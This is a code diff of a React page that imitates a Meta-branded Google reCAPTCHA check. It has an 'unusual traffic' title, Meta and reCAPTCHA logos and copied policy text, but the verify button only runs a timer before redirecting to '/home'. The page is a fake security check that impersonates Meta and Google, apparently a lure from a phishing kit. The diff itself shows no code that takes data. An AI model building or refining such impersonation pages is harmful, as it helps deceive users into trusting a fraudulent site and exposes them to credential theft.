@@ -7,24 +7,25 @@ const Index = () => {
     const [isLoading, setIsLoading] = useState(false);
     const [isShowCheckMark, setIsShowCheckMark] = useState(false);
     
-    const handleVerify = async () => {
+    const handleVerify = () => {
         if (isLoading || isShowCheckMark) return;
         
         setIsLoading(true);
         
-        // Chỉ 1 setTimeout duy nhất, không có axios
+        // Giả lập verify trong 1.5s
         setTimeout(() => {
             setIsShowCheckMark(true);
             setIsLoading(false);
-        }, 1800); // Thời gian vừa đủ để thấy loading
+        }, 1500);
     };
 
+    // Tự động redirect sau khi verify thành công
     useEffect(() => {
         if (isShowCheckMark) {
-            // Redirect sau khi show checkmark
-            setTimeout(() => {
+            const timer = setTimeout(() => {
                 window.location.href = '/home';
-            }, 600);
+            }, 800);
+            return () => clearTimeout(timer);
         }
     }, [isShowCheckMark]);
 
@@ -32,7 +33,10 @@ const Index = () => {
         <div className='flex flex-col items-center justify-center pt-[150px]'>
             <title>Our systems have detected unusual traffic from your computer network</title>
             <div className='w-[300px]'>
-                <img src={MetaImage} alt='' className='w-16' />
+                {/* Meta Logo */}
+                <img src={MetaImage} alt='Meta' className='w-16' />
+                
+                {/* reCAPTCHA Box */}
                 <div className='flex w-full items-center justify-start py-5'>
                     <div className='flex w-full items-center justify-between rounded-md border-2 bg-[#f9f9f9] pr-2 text-[#4c4a4b]'>
                         <div className='flex items-center justify-start'>
@@ -56,15 +60,21 @@ const Index = () => {
                                     )}
                                 </button>
                             </div>
-                            <div className='mr-4 ml-1 text-left text-[14px] font-semibold tracking-normal text-gray-500'>I&apos;m not a robot</div>
+                            <div className='mr-4 ml-1 text-left text-[14px] font-semibold tracking-normal text-gray-500'>
+                                I&apos;m not a robot
+                            </div>
                         </div>
+                        
+                        {/* reCAPTCHA Branding */}
                         <div className='mt-2 mb-0.5 ml-4 flex flex-col items-center self-end text-[#9d9ba7]'>
-                            <img src={ReCaptchaImage} alt='' className='h-10 w-10' />
+                            <img src={ReCaptchaImage} alt='reCAPTCHA' className='h-10 w-10' />
                             <p className='text-[10px] font-bold'>reCAPTCHA</p>
                             <small className='text-[8px] text-gray-500'>Privacy - Terms</small>
                         </div>
                     </div>
                 </div>
+
+                {/* Description Text */}
                 <div className='flex flex-col gap-4 text-[13px] leading-[1.3] text-gray-700'>
                     <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
                     <p>We&apos;ve used Google&apos;s reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google&apos;s Privacy Policy and Terms of Use.</p>
